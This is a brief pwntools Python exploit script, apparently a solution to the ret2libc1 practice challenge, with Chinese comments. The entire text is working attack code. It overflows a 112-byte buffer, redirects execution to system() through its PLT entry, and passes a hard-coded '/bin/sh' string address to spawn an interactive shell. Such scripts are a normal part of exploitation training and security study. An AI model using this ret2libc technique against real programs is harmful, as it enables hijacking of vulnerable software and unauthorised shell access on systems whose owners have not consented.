from pwn import *

p = process('./ret2libc1')

elf = ELF('./ret2libc1')  # 加载 ELF 文件，便于自动解析符号表

binsh_addr = 0x08048720
system_ret = b'AAAA'

# system() 的 PLT 地址由 ELF 类自动查找
payload = flat([b'A' * 112, elf.plt['system'], system_ret, binsh_addr])

p.sendline(payload)
p.interactive()